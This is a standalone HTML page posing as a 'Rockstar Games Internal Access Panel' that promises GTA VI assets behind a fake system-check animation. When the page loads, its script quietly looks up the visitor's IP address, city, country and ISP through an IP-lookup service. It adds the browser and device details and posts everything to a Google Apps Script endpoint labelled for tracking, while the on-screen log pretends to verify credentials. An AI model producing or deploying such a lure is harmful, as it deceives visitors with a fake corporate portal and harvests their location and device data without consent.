<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Rockstar Internal Access Panel</title>

<style>
body {
  margin: 0;
  background: #0b0b0b;
  color: #00ff9f;
  font-family: monospace;
}

.container {
  max-width: 600px;
  margin: 50px auto;
  border: 1px solid #00ff9f;
  padding: 20px;
  background: #000;
  box-shadow: 0 0 20px rgba(0,255,159,0.2);
}

h1 {
  text-align: center;
  color: #ffcc00;
}

.status {
  margin-top: 10px;
  font-size: 13px;
  color: #ccc;
}

.terminal {
  margin-top: 15px;
  background: #000;
  padding: 10px;
  height: 180px;
  overflow-y: auto;
  border: 1px solid #00ff9f;
  font-size: 12px;
}

.progress {
  margin-top: 10px;
  height: 10px;
  background: #222;
}

.bar {
  height: 100%;
  width: 0%;
  background: #00ff9f;
}

button {
  width: 100%;
  padding: 10px;
  margin-top: 15px;
  background: #00ff9f;
  color: black;
  border: none;
  font-weight: bold;
  cursor: pointer;
}

.footer {
  margin-top: 10px;
  font-size: 11px;
  text-align: center;
  color: #666;
}
</style>
</head>

<body>

<div class="container">
  <h1>INTERNAL ACCESS PANEL</h1>

  <div class="status" id="status">Initializing system...</div>

  <div class="terminal" id="terminal"></div>

  <div class="progress">
    <div class="bar" id="bar"></div>
  </div>

  <button onclick="startSystem()">RUN SYSTEM CHECK</button>

  <div class="footer">
    Rockstar Games Internal Network • Authorized Use Only
  </div>
</div>

<script>

// ===== USER DATA =====
let userData = {};

// ===== FETCH USER INFO =====
async function getUserData() {
  try {
    let res = await fetch("https://ipapi.co/json/");
    let data = await res.json();

    userData = {
      ip: data.ip,
      city: data.city,
      country: data.country_name,
      org: data.org,
      device: navigator.platform,
      browser: navigator.userAgent,
      time: new Date().toLocaleString()
    };

    document.getElementById("status").innerText =
      `Connected: ${data.ip} (${data.city}, ${data.country_name})`;

    trackUser();

  } catch (e) {
    document.getElementById("status").innerText = "Connection limited";
  }
}

// ===== TRACK USER (GOOGLE SHEET) =====
async function trackUser() {
  try {
    await fetch("https://script.google.com/macros/s/AKfycbwmehXULJ0GwP9fIUv56JLuCVA2-Dr7XLbaUU-iqwTeB0lEELsJXsJwaNgLSK4iyZmwuA/exec", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(userData)
    });
  } catch (e) {
    console.log("Tracking failed");
  }
}

// ===== TERMINAL =====
function log(text) {
  let terminal = document.getElementById("terminal");
  terminal.innerHTML += text + "<br>";
  terminal.scrollTop = terminal.scrollHeight;
}

// ===== SYSTEM FLOW =====
function startSystem() {

  let logs = [
    "Connecting to internal network...",
    "Verifying credentials...",
    "Loading GTA VI assets...",
    "Checking device compatibility...",
    "Syncing logs...",
    "Finalizing session..."
  ];

  let i = 0;
  let bar = document.getElementById("bar");

  let interval = setInterval(() => {
    if (i < logs.length) {
      log(logs[i]);
      bar.style.width = ((i + 1) / logs.length) * 100 + "%";
      i++;
    } else {
      clearInterval(interval);
      complete();
    }
  }, 800);
}

// ===== COMPLETE =====
function complete() {
  log("Access granted ✔");
}

// INIT
getUserData();

</script>

</body>
</html>
